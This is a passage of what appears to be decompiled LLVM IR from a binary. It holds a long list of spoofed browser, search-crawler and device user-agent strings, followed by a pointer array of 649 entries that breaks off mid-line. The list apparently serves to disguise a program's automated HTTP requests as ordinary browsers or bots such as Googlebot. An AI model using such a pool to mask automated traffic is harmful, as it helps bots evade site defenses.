@global_var_805aad0.468 = constant [88 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_805ab28.469 = constant [85 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\00"
@global_var_805ab80.470 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_805abc0.471 = constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00"
@global_var_805ac28.472 = constant [52 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)\00"
@global_var_805ac5c.473 = constant [48 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)\00"
@global_var_805ac8c.474 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0\00"
@global_var_805ad00.475 = constant [105 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\00"
@global_var_805ad6c.476 = constant [90 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\00"
@global_var_805adc8.477 = constant [103 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\00"
@global_var_805ae30.478 = constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00"
@global_var_805ae7c.479 = constant [84 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_805aed0.480 = constant [103 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6\00"
@global_var_805af38.481 = constant [75 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0\00"
@global_var_805af84.482 = constant [130 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_805b008.483 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_805b04c.484 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_805b090.485 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_805b0d4.486 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_805b118.487 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_805b15c.488 = constant [51 x i8] c"Gigabot/3.0 (http://www.gigablast.com/spider.html)\00"
@global_var_805b190.489 = constant [61 x i8] c"LG-BDP Linux/2.6.35 UPnP/1.0 DLNADOC/1.50 LGE_DLNA_SDK/1.5.0\00"
@global_var_805b1d0.490 = constant [127 x i8] c"Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+\00"
@global_var_805b250.491 = constant [107 x i8] c"Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+\00"
@global_var_805b2bc.492 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_805b300.493 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_805b370.494 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_805b3e4.495 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_805b430.496 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_805b4b8.497 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_805b504.498 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_805b574.499 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_805b5e4.500 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_805b658.501 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_805b6d0.502 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_805b718.503 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_805b790.504 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_805b800.505 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_805b870.506 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_805b904.507 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_805b94c.508 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_805b994.509 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_805ba10.510 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_805ba8c.511 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_805bae0.512 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_805bb34.513 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_805bb88.514 = constant [149 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_805bc20.515 = constant [181 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_805bcd8.516 = constant [157 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805bd78.517 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_805bde4.518 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_805be54.519 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_805becc.520 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805bf10.521 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_805bf88.522 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805bfcc.523 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_805c030.524 = constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00"
@global_var_805c078.525 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805c0cc.526 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_805c144.527 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_805c1ac.528 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805c1f8.529 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_805c25c.530 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_805c2c4.531 = constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00"
@global_var_805c350.532 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805c3a4.533 = constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_805c430.534 = constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00"
@global_var_805c48c.535 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_805c4d8.536 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_805c550.537 = constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00"
@global_var_805c5a8.538 = constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_805c628.539 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00"
@global_var_805c694.540 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_805c70c.541 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00"
@global_var_805c758.542 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00"
@global_var_805c7c8.543 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00"
@global_var_805c80c.544 = constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_805c84c.545 = constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00"
@global_var_805c890.546 = constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00"
@global_var_805c8d4.547 = constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00"
@global_var_805c91c.548 = constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00"
@global_var_805c99c.549 = constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00"
@global_var_805c9f0.550 = constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00"
@global_var_805ca80.551 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_805cae4.552 = constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805cb34.553 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_805cba0.554 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00"
@global_var_805cbec.555 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_805cc64.556 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_805cca8.557 = constant [51 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\00"
@global_var_805ccdc.558 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_805cd20.559 = constant [121 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)\00"
@global_var_805cd9c.560 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805cdec.561 = constant [56 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\00"
@global_var_805ce24.562 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4\00"
@global_var_805ce9c.563 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805cee0.564 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10\00"
@global_var_805cf20.565 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52\00"
@global_var_805cf60.566 = constant [138 x i8] c"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36\00"
@global_var_805cfec.567 = constant [42 x i8] c"Opera/8.5 (X11; i686 Linux; U; ru, en_US)\00"
@global_var_805d018.568 = constant [58 x i8] c"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)\00"
@global_var_805d054.569 = constant [48 x i8] c"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9\00"
@global_var_805d084.570 = constant [73 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25\00"
@global_var_805d0d0.571 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50\00"
@global_var_805d110.572 = constant [80 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant\00"
@global_var_805d160.573 = constant [19 x i8] c"C4PC UserAgent/0.7\00"
@global_var_805d173.574 = constant [19 x i8] c"Googlebot 1.01.003\00"
@global_var_805d188.575 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\00"
@global_var_805d1d4.576 = constant [104 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3\00"
@global_var_805d23c.577 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1\00"
@global_var_805d290.578 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_805d2dc.579 = constant [183 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_805d394.580 = constant [170 x i8] c"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)\00"
@global_var_805d440.581 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_805d494.582 = constant [195 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)\00"
@global_var_805d558.583 = constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00"
@global_var_805d5f4.584 = constant [112 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8\00"
@global_var_805d664.585 = constant [92 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6\00"
@global_var_805d6c0.586 = constant [81 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre\00"
@global_var_805d714.587 = constant [117 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre\00"
@global_var_805d78c.588 = constant [91 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre\00"
@global_var_805d7e8.589 = constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00"
@global_var_805d84c.590 = constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00"
@global_var_805d8ac.591 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00"
@global_var_805d904.592 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00"
@global_var_805d948.593 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00"
@global_var_805d998.594 = constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00"
@global_var_805da1c.595 = constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00"
@global_var_805da70.596 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00"
@global_var_805dae0.597 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00"
@global_var_805db78.598 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00"
@global_var_805dbc4.599 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00"
@global_var_805dc44.600 = constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00"
@global_var_805dcc4.601 = constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00"
@global_var_805dd44.602 = constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00"
@global_var_805ddc4.603 = constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00"
@global_var_805de44.604 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00"
@global_var_805dec4.605 = constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00"
@global_var_805df3c.606 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_805dfa8.607 = constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00"
@global_var_805e01c.608 = constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00"
@global_var_805e09c.609 = constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00"
@global_var_805e0d8.610 = constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00"
@global_var_805e120.611 = constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00"
@global_var_805e164.612 = constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00"
@global_var_805e234.613 = constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00"
@global_var_805e290.614 = constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00"
@global_var_805e2fc.615 = constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00"
@global_var_805e344.616 = constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00"
@global_var_805e3cc.617 = constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00"
@global_var_805e416.618 = constant [22 x i8] c"Wget/1.12 (linux-gnu)\00"
@global_var_805e42c.619 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_805e4a0.620 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_805e514.621 = constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00"
@global_var_805e5a0.622 = constant [649 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_8057bcc.320, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_8057c0c.321, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_8057c4c.322, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_8057cdc.323, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_8057d14.324, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_8057d34.325, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_8057d4c.326, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_8057da4.327, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_8057e44.328, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_8057e98.329, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_8057f0c.330, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_8057f4c.331, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_8058004.332, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_8058058.333, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_80580b0.334, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_8058108.335, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_8058148.336, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* 